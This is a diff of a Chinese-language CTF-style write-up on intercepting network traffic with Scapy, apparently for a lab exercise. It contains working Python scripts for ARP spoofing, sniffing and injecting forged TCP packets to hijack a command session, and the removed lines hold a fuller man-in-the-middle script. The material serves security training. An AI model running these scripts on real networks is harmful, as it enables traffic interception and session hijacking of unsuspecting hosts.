@@ -1,3 +1,29 @@
+# Scapy
+
+
+
+ **`send`（发送网络层数据包）**
+
+- **作用**：`send` 用于发送 **网络层**（Layer 3）数据包，通常用于发送 **IP 数据包** 或者是更高层协议（如 TCP、UDP）。
+- **使用场景**：当你需要发送的数据包属于 **网络层**，例如包含 **IP 数据包**，并且你希望 Scapy 自动处理数据链路层的部分（如 Ethernet 帧）时，使用 `send`。
+
+**`sendp`（发送链路层数据包）**
+
+- **作用**：`sendp` 用于发送 **链路层**（Layer 2）数据包，也就是以太网帧或其他数据链路层协议的数据包。
+- **使用场景**：当你需要发送的包包含 **Ethernet 帧** 或者是低层协议（如 ARP）时，应该使用 `sendp`。它允许你直接操作和发送数据链路层的数据包，不需要依赖网络层（如 IP）。
+
+**区别总结**
+
+- **`sendp`**：用于发送 **链路层** 数据包（例如：Ethernet、ARP、帧）。需要你自己构建完整的链路层数据包。
+- **`send`**：用于发送 **网络层** 数据包（例如：IP、ICMP、TCP、UDP）。Scapy 会自动为你封装合适的链路层数据包（如 Ethernet 帧）。
+
+**选择哪一个？**
+
+- 如果你需要手动控制 **Ethernet 帧** 或其他链路层协议，选择 `sendp`。
+- 如果你只关心 **网络层**（如 IP、ICMP、TCP 等），选择 `send`，Scapy 会帮你处理链路层的部分。
+
+
+
 # Level 1
 
 ## 思路
@@ -304,6 +330,12 @@ ip addr
 
 
 
+注意，我们此时是没有ip的。也就是说，我们都只有mac地址。
+
+我们只需要发送ether包，进行广播就可以了。
+
+
+
 `ifconfig` 是一种旧的网络接口管理工具
 
 `ip`是一个现代化的工具。
@@ -316,7 +348,9 @@ ip addr
 from scapy.all import *
 
 # 创建自定义的以太网包
-ethernet_frame = Ether(dst="ff:ff:ff:ff:ff:ff", type=0xFFFF) / IP(dst="10.0.0.3")
+ethernet_frame = Ether(dst="ff:ff:ff:ff:ff:ff", type=0xFFFF)
+
+conf.iface = "eth0"
 
 # 发送包
 sendp(ethernet_frame)
@@ -324,8 +358,7 @@ sendp(ethernet_frame)
 
 
 
-- `Ether(dst="ff:ff:ff:ff:ff:ff", type=0xFFFF)`：创建一个以太网帧，`dst` 为目标 MAC 地址（这里是广播地址 `ff:ff:ff:ff:ff:ff`，即向所有设备广播），`type=0xFFFF` 设置以太网帧的类型。
-- `/ IP(dst="10.0.0.3")`：这个部分是向数据帧中添加一个 IP 层，目标 IP 是 `10.0.0.3`，即你想要发送数据包的远程主机。
+- `Ether(dst="ff:ff:ff:ff:ff:ff", type=0xFFFF)`：创建一个以太网帧，`dst` 为目标 MAC 地址（这里是广播地址 `ff:ff:ff:ff:ff:ff`，即向所有设备广播），`type=0xFFFF` 设置以太网帧的类型(可以忽略这个)。
 - `sendp(ethernet_frame)`：发送这个以太网帧。
 
 如果你需要对 `scapy` 进行高级配置（如指定网络接口），你可以通过 `conf.iface` 来指定发送包的接口。例如，假设你的接口是 `eth0`：
@@ -338,7 +371,11 @@ conf.iface = "eth0"
 
 如下
 
-![image-20241124193542373](./03%20Intercepting%20Communication.assets/image-20241124193542373.png)
+![image-20241126213542402](./03%20Intercepting%20Communication.assets/image-20241126213542402.png)
+
+
+
+
 
 
 
@@ -358,7 +395,7 @@ conf.iface = "eth0"
 from scapy.all import *
 
 # 构建数据包
-ip_packet = IP(dst="10.0.0.3", proto=0xFF) / Raw(b"Hello, this is a custom packet!")
+ip_packet = IP(dst="10.0.0.3", proto=0xFF)
 
 conf.iface = "eth0"
 
@@ -369,15 +406,19 @@ send(ip_packet)
 - `IP(dst="10.0.0.3", proto=0xFF)`：构建一个目标地址为 `10.0.0.3`，协议为 `0xFF` 的 IP 数据包。
 - `Raw(b"Hello, this is a custom packet!")`：附加自定义的原始数据（这部分可以根据需要修改）。
 
+send会自动帮我们处理ether层的内容。
+
+Raw要不要都可以。
+
 ## 截图
 
 如下
 
 ![image-20241124194325763](./03%20Intercepting%20Communication.assets/image-20241124194325763.png)
 
-## 总结
 
-注意每次start challenge，你都没有ip，要手动配置ip。
+
+
 
 # Level 10
 
@@ -388,6 +429,18 @@ send(ip_packet)
 ## 思路
 
 估计还是使用scapy
+
+记住，TCP/UDP是什么？是传输层的协议。
+
+应用层
+
+传输层
+
+网络层
+
+数据链路层
+
+物理层
 
 ## EXP
 
@@ -472,6 +525,10 @@ else:
 gpt
 
 在你只知道ip，但是不知道对方的mac地址的时候，你就需要发送arp包，进行广播，获取到对方的mac地址。
+
+`ARP op=is-at` 表示的是 ARP 响应（`op=2`），即目标 IP 地址对应的 MAC 地址。
+
+注意，这里我们是发送响应包，而不是请求包。所以op=2
 
 ## EXP
 
@@ -571,375 +628,65 @@ sendp(packet, iface="eth0", verbose=False)
 
 
 
+## 思路
 
+我们没办法拦包修改再发送，而且这样做的话如果有时间戳的话就会出错。
+
+所以我们就获取到包，然后修改后就发送，不影响之前的包。
+
+也就是获取到COMMANDS:\nECHO\nFLAG\nCOMMAND:\n之后的，我们需要把ECHO修改为FLAG即可。
+
+也可以试一试修改ECHO那个包。也许会更简单一点。
+
+我是在接收到COMMANDS:\nECHO\nFLAG\nCOMMAND:\n之后自己写一个包。
 
 ## EXP
 
 ```py
 from scapy.all import *
-
-sender_ip = "10.0.0.3"
-
-sender_mac = "d6:31:26:73:8b:2c"
-
-target_ip = "10.0.0.4"
-
-arp_reply = ARP(op=2, psrc=sender_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=sender_mac)
-
-ethernet_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
-
-packet = ethernet_frame / arp_reply
-
-sendp(packet, iface="eth0", verbose=False)
-```
-
-
-
-第二个
-
-```py
-from scapy.all import *
-
-sender_ip = "10.0.0.4"
-
-sender_mac = "d6:31:26:73:8b:2c"
-
-target_ip = "10.0.0.3"
-
-arp_reply = ARP(op=2, psrc=sender_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=sender_mac)
-
-ethernet_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
-
-packet = ethernet_frame / arp_reply
-
-sendp(packet, iface="eth0", verbose=False)
-```
-
-
-
-```py
-from scapy.all import rdpcap, TCP
-
-def extract_tcp_data_from_pcap(pcap_file, target_port):
-    # 读取 pcap 文件
-    packets = rdpcap(pcap_file)
-    extracted_data = []
-
-    # 遍历所有数据包
-    for pkt in packets:
-        # 筛选出 TCP 包，并且检查是否与目标端口相关
-        if TCP in pkt and (pkt[TCP].sport == target_port or pkt[TCP].dport == target_port):
-            # 提取 TCP Payload
-            if pkt[TCP].payload:
-                try:
-                    # 获取来源 IP 和目的 IP
-                    src_ip = pkt[0][1].src
-                    dst_ip = pkt[0][1].dst
-
-                    # 将 TCP Payload 转换为字符串
-                    payload_data = bytes(pkt[TCP].payload).decode('latin1', errors='ignore')
-
-                    # 保存来源 IP、目的 IP 和数据
-                    extracted_data.append({
-                        "src": src_ip,
-                        "dst": dst_ip,
-                        "data": payload_data
-                    })
-                except UnicodeDecodeError:
-                    # 如果解码失败，忽略该部分数据
-                    continue
-
-    return extracted_data
-
-def remove_duplicate_characters(data):
-    # 使用字符串去重
-    return ''.join(dict.fromkeys(data))
-
-# 主程序
-if __name__ == "__main__":
-    # 指定 pcap 文件和目标端口
-    pcap_file = "144.pcap"  # 替换为你的文件路径
-    target_port = 31337
-
-    # 提取并打印与目标端口相关的 TCP Payload 数据
-    packets_data = extract_tcp_data_from_pcap(pcap_file, target_port)
-
-    print("Extracted Data:")
-    for entry in packets_data:
-        # 去重重复字符
-        clean_data = remove_duplicate_characters(entry["data"])
-        print(f"From {entry['src']} To {entry['dst']}: {clean_data}")
-
-```
-
-
-
-
-
-```py
-from scapy.all import rdpcap, IP, TCP, send
-
-def extract_and_respond(pcap_file, target_port, custom_response):
-    # 读取 pcap 文件
-    packets = rdpcap(pcap_file)
-
-    for pkt in packets:
-        # 筛选出 TCP 包，并且检查是否与目标端口相关
-        if TCP in pkt and (pkt[TCP].sport == target_port or pkt[TCP].dport == target_port):
-            if pkt[TCP].payload:
-                try:
-                    # 提取来源和目的 IP 地址
-                    src_ip = pkt[IP].src
-                    dst_ip = pkt[IP].dst
-
-                    # 提取数据包内容
-                    payload_data = bytes(pkt[TCP].payload).decode('latin1', errors='ignore').strip()
-
-                    print(f"From {src_ip} To {dst_ip}: {payload_data}")
-
-                    # 如果匹配到目标数据并需要响应
-                    if "ECHO" in payload_data:
-                        print(f"Responding with: {custom_response}")
-
-                        # 构建并发送伪造响应数据包
-                        ip_layer = IP(src=dst_ip, dst=src_ip)  # 交换 src 和 dst
-                        tcp_layer = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="PA", seq=pkt[TCP].ack, ack=pkt[TCP].seq + len(payload_data))
-                        response_packet = ip_layer / tcp_layer / custom_response
-                        send(response_packet, verbose=False)
-                except UnicodeDecodeError:
-                    continue
-
-if __name__ == "__main__":
-    # 读取 pcap 文件和目标端口
-    pcap_file = "144.pcap"  # 替换为你的文件路径
-    target_port = 31337
-
-    # 定义自定义响应
-    custom_response = "ECHO FLAG"
-
-    # 提取并发送响应
-    extract_and_respond(pcap_file, target_port, custom_response)
-
-```
-
-
-
-
-
-
-
-```py
-import scapy.all as scapy
-import os
 import time
-import random
-import socket
 
-class MITMHost:
-    def __init__(self, attacker_ip, attacker_mac, server_ip, server_mac, client_ip, client_mac):
-        self.attacker_ip = attacker_ip
-        self.attacker_mac = attacker_mac
-        self.server_ip = server_ip
-        self.server_mac = server_mac
-        self.client_ip = client_ip
-        self.client_mac = client_mac
+sender_mac = get_if_hwaddr("eth0")
 
-    def send_arp(self, target_ip, target_mac, source_ip, source_mac):
-        """
-        发送ARP包，伪造ARP响应，告诉目标主机该IP的MAC地址
-        """
-        arp_packet = scapy.ARP(op=2, psrc=source_ip, pdst=target_ip, hwsrc=source_mac, hwdst=target_mac)
-        scapy.sendp(arp_packet, verbose=False)
+ip3 = "10.0.0.3"
+ip4 = "10.0.0.4"
 
-    def spoof(self):
-        """
-        伪造ARP响应，使客户端与服务器之间的流量转发到攻击者
-        """
-        self.send_arp(self.client_ip, self.client_mac, self.server_ip, self.server_mac)
-        self.send_arp(self.server_ip, self.server_mac, self.client_ip, self.client_mac)
+def cheat(srcip,dstip,sender_mac):
+    arp_reply = ARP(op=2, psrc=srcip, pdst=dstip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=sender_mac)
+    ethernet_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
+    packet = ethernet_frame / arp_reply
+    sendp(packet, iface="eth0", verbose=False)
+    # print("------------------")
+    # print(pkt[IP].src)
+    # print(pkt[IP].dst)
+    # print(pkt[TCP].flags)
+    # pkt.show()
+    # pkt.show()
+    
+def sniff_callback(pkt):
+    print("-------------------------------------------")
+    pkt.show()
+    if pkt.haslayer(Raw) and bytes(pkt[TCP].payload) == b"COMMANDS:\nECHO\nFLAG\nCOMMAND:\n":
+        # print("get it!")
+        # print()
+        # 构造一个伪造的TCP数据包
+        fake_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="PA", seq=pkt[TCP].ack, ack=pkt[TCP].seq + 29) / Raw(load = b'FLAG\n')
+        # fake_pkt2.show()
+        send(fake_pkt, iface="eth0", verbose=False)
+        print(f"Sent fake packet with payload: FAKE RESPONSE")
 
-    def restore(self):
-        """
-        恢复正常的ARP表
-        """
-        self.send_arp(self.client_ip, self.client_mac, self.server_ip, self.server_mac)
-        self.send_arp(self.server_ip, self.server_mac, self.client_ip, self.client_mac)
+print("cheat finish")
 
-    def run(self):
-        """
-        启动ARP欺骗攻击并嗅探流量
-        """
-        while True:
-            self.spoof()  # 持续伪造ARP响应
-            time.sleep(1)
+cheat(ip3,ip4,sender_mac)
+cheat(ip4,ip3,sender_mac)
+print("go ahead")
 
-class MITMHandshakeHost:
-    def __init__(self, attacker_ip, attacker_mac, server_ip, client_ip):
-        self.attacker_ip = attacker_ip
-        self.attacker_mac = attacker_mac
-        self.server_ip = server_ip
-        self.client_ip = client_ip
-        self.seq = None  # 用于记录当前的TCP序列号
-
-    def intercept_traffic(self, packet):
-        """
-        拦截并篡改TCP流量，特别是在握手阶段
-        """
-        if "IP" in packet and "TCP" in packet:
-            # 监听来自客户端的SYN包，进行握手
-            if packet["IP"].src == self.client_ip and packet["TCP"].flags == "S" and packet["IP"].dst == self.server_ip:
-                self.seq = random.randrange(0, 2**32)
-                scapy.sendp(
-                    scapy.Ether(src=self.attacker_mac, dst=packet["Ether"].src) /
-                    scapy.IP(src=self.server_ip, dst=self.client_ip) /
-                    scapy.TCP(sport=packet["TCP"].dport, dport=packet["TCP"].sport, seq=self.seq, ack=packet["TCP"].seq + 1, flags="SA"),
-                    iface="eth0",
-                    verbose=False,
-                )
-
-            # 监听服务器的ACK包并确认连接
-            if packet["IP"].src == self.server_ip and packet["TCP"].flags == "A" and packet["IP"].dst == self.client_ip:
-                # 发送数据包完成握手，进行后续操作
-                scapy.sendp(
-                    scapy.Ether(src=self.attacker_mac, dst=packet["Ether"].src) /
-                    scapy.IP(src=self.server_ip, dst=self.client_ip) /
-                    scapy.TCP(sport=packet["TCP"].dport, dport=packet["TCP"].sport, seq=self.seq, ack=packet["TCP"].seq + 1, flags="A"),
-                    iface="eth0",
-                    verbose=False,
-                )
-                return True
-
-    def run(self):
-        """
-        启动TCP嗅探和篡改
-        """
-        scapy.sniff(prn=self.intercept_traffic, iface="eth0")
-
-class MITMAuthenticatedHost:
-    def __init__(self, attacker_ip, server_ip, client_ip, attacker_mac):
-        self.attacker_ip = attacker_ip
-        self.server_ip = server_ip
-        self.client_ip = client_ip
-        self.attacker_mac = attacker_mac
-        self.secret = None
-
-    def intercept_authentication(self, connection):
-        """
-        拦截并伪造 secret 认证信息
-        """
-        self.send(connection, b"SECRET:\n")
-        client_secret = connection.recv(0x1000).decode("latin").strip()
-        self.secret = client_secret  # 获取客户端的 secret
-
-        self.send(connection, b"COMMANDS:\nECHO\nFLAG\nCOMMAND:\n")
-        command = connection.recv(0x1000).decode("latin").strip()
-
-        if command == "FLAG":
-            if self.secret:
-                self.send(connection, self.secret.encode())  # 获取 secret
-                self.send(connection, b"flag{fake_flag}\n")  # 返回伪造的 flag
-            else:
-                self.send(connection, b"UNAUTHORIZED\n")
-        else:
-            self.send(connection, b"???\n")
-
-    def send(self, connection, data):
-        """
-        向连接发送数据
-        """
-        connection.sendall(data)
-
-    def run(self):
-        """
-        启动认证劫持
-        """
-        while True:
-            try:
-                with socket.create_connection((self.server_ip, 31337)) as connection:
-                    self.intercept_authentication(connection)
-            except (ConnectionError, TimeoutError):
-                pass
-            time.sleep(1)
-
-def run_mitm_attack():
-    attacker_ip = "10.0.0.1"  # 攻击者的 IP
-    attacker_mac = "00:00:00:00:00:01"  # 攻击者的 MAC 地址
-    server_ip = "10.0.0.3"  # 服务器的 IP 地址
-    server_mac = "00:00:00:00:00:02"  # 服务器的 MAC 地址
-    client_ip = "10.0.0.2"  # 客户端的 IP 地址
-    client_mac = "00:00:00:00:00:03"  # 客户端的 MAC 地址
-
-    # 启动 ARP 欺骗攻击
-    mitm_host = MITMHost(attacker_ip, attacker_mac, server_ip, server_mac, client_ip, client_mac)
-    mitm_host.run()
-
-    # 启动 TCP 握手篡改
-    mitm_handshake_host = MITMHandshakeHost(attacker_ip, attacker_mac, server_ip, client_ip)
-    mitm_handshake_host.run()
-
-    # 启动认证拦截
-    mitm_authenticated_host = MITMAuthenticatedHost(attacker_ip, server_ip, client_ip, attacker_mac)
-    mitm_authenticated_host.run()
-
-run_mitm_attack()
-
+sniff(filter="tcp", prn=sniff_callback, iface="eth0")
 ```
 
+## 总结
 
+闹半天不过是FLAG\n写成FLAG/n，我他妈的真人麻了。
 
-
-
-```py
-from scapy.all import *
-
-local_mac = get_if_hwaddr("eth0")
-local_ip = '10.0.0.2'
-
-target_ip1 = '10.0.0.3'
-target_mac1 = getmacbyip(target_ip1)
-target_ip2 = '10.0.0.4'
-target_mac2 = getmacbyip(target_ip2)
-
-# ether_pkt = Ether(src=local_mac, dst=target_ip1)
-
-arp_spoof = ARP(
-        pdst=target_ip2,  # Target IP address
-        hwdst=target_mac2, # Target MAC address
-        psrc=target_ip1,   # Source IP address (your IP)
-        hwsrc=local_mac, # Source MAC address (your MAC)
-        op=2              # op=2 for ARP reply (is-at)
-    )
-send(arp_spoof)
-arp_spoof = ARP(
-        pdst=target_ip1,  # Target IP address
-        hwdst=target_mac1, # Target MAC address
-        psrc=target_ip2,   # Source IP address (your IP)
-        hwsrc=local_mac, # Source MAC address (your MAC)
-        op=2              # op=2 for ARP reply (is-at)
-    )
-send(arp_spoof)
-
-def pkt_inject(pkt):
-    # return
-    if pkt[TCP] and bytes(pkt[TCP].payload) == b'COMMANDS:\nECHO\nFLAG\nCOMMAND:\n':
-        print(b'pwn!')
-        ip_pkt = IP(src='10.0.0.4', dst='10.0.0.3')
-        print(pkt[TCP].seq)
-        tcp_pkt1 = TCP(sport=pkt[TCP].dport, dport=31337, flags='A', seq=pkt[TCP].ack, ack=pkt[TCP].seq+29)
-        tcp_pkt2 = TCP(sport=pkt[TCP].dport, dport=31337, flags='PA', seq=pkt[TCP].ack, ack=pkt[TCP].seq+29) / b'FLAG\n'
-        send(ip_pkt / tcp_pkt1)
-        send(ip_pkt / tcp_pkt2)
-
-
-
-
-
-packets = sniff(iface='eth0', count=200, prn=pkt_inject)
-
-wrpcap('flag.pcap', packets)
-# for i in range(20):
-#     print(packets[i])
-#     print(packets[i].show())
-#     print(bytes(packets[i][TCP].payload))
-```
+呜呜呜呜呜呜最后一块拼图终于拼上了。
 
